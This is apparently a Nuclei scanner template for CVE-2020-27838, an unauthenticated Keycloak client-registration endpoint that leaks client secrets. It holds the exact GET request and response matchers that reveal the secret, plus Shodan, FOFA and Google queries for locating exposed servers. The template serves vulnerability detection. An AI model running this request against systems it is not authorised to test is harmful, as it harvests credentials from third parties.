http:
- matchers:
  - condition: and
    regex:
    - '"clientId":\s*"security-admin-console"'
    - '"secret":'
    type: regex
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/auth/realms/master/clients-registrations/default/security-admin-console'
id: CVE-2020-27838
info:
  author: mchklt
  classification:
    cpe: cpe:2.3:a:redhat:keycloak:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-27838
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
    cvss-score: 6.5
    cwe-id: CWE-287
    epss-percentile: 0.98972
    epss-score: 0.78293
  description: 'A flaw was found in keycloak in versions prior to 13.0.0. The client
    registration endpoint allows fetching information about PUBLIC clients (like client
    secret) without authentication which could be an issue if the same PUBLIC client
    changed to CONFIDENTIAL later. The highest threat from this vulnerability is to
    data confidentiality.

    '
  impact: 'The vulnerability allows an attacker to gain sensitive information from
    the KeyCloak server.

    '
  metadata:
    fofa-query:
    - title="keycloak"
    - icon_hash=-1105083093
    - body="keycloak"
    google-query: intitle:"keycloak"
    max-request: 1
    product: keycloak
    shodan-query:
    - title:"keycloak"
    - http.title:"keycloak"
    - http.html:"keycloak"
    - http.favicon.hash:-1105083093
    vendor: redhat
  name: KeyCloak - Information Exposure
  reference:
  - https://bugzilla.redhat.com/show_bug.cgi?id=1906797
  - https://nvd.nist.gov/vuln/detail/CVE-2020-27838
  - https://github.com/muneebaashiq/MBProjects
  - https://github.com/j4k0m/godkiller
  remediation: 'Apply the latest security patches or updates provided by the KeyCloak
    vendor.

    '
  severity: medium
  tags: cve,cve2020,keycloak,exposure,redhat,vuln
